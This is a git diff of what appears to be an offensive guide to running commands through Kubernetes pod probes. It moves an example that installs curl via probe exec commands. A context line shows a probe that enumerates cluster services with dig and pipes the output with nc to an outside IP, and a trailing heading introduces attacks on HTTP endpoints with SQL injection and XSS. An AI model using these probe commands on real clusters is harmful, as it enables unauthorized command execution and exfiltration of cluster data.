@@ -41,6 +41,44 @@ spec:
       periodSeconds: 5
 EOF
 ```
+
+### Examples2: Installing applications the pod at deployment 
+```
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    test: liveness
+  name: liveness-exec39
+spec:
+  containers:
+  - name: liveness
+    image: ubuntu
+    args:
+    - /bin/sh
+    - -c
+    - touch /tmp/healthy;sleep 600
+    readinessProbe:
+      exec:
+        command:
+        - apt-get 
+        - update
+      initialDelaySeconds: 5
+      periodSeconds: 10
+      timeoutSeconds: 60
+    livenessProbe:
+      exec:
+        command:
+        - apt-get 
+        - install
+        - -y
+        - curl
+      initialDelaySeconds: 60
+      periodSeconds: 100
+      timeoutSeconds: 60
+EOF
+```
 Even better -- command chaining :-)
 ```
 kubectl apply -f - <<EOF
@@ -93,43 +131,6 @@ spec:
         - apt-get install -y ncat dnsutils; dig +noall +answer srv any.any.svc.cluster.local | nc 192.168.0.131 8889 
       initialDelaySeconds: 5
       periodSeconds: 5
-EOF
-```
-### Examples2: Installing applications the pod at deployment 
-```
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: Pod
-metadata:
-  labels:
-    test: liveness
-  name: liveness-exec39
-spec:
-  containers:
-  - name: liveness
-    image: ubuntu
-    args:
-    - /bin/sh
-    - -c
-    - touch /tmp/healthy;sleep 600
-    readinessProbe:
-      exec:
-        command:
-        - apt-get 
-        - update
-      initialDelaySeconds: 5
-      periodSeconds: 10
-      timeoutSeconds: 60
-    livenessProbe:
-      exec:
-        command:
-        - apt-get 
-        - install
-        - -y
-        - curl
-      initialDelaySeconds: 60
-      periodSeconds: 100
-      timeoutSeconds: 60
 EOF
 ```
 ### Examples3: Attacking http(s) endpoints using sql injection, XXS, ... 
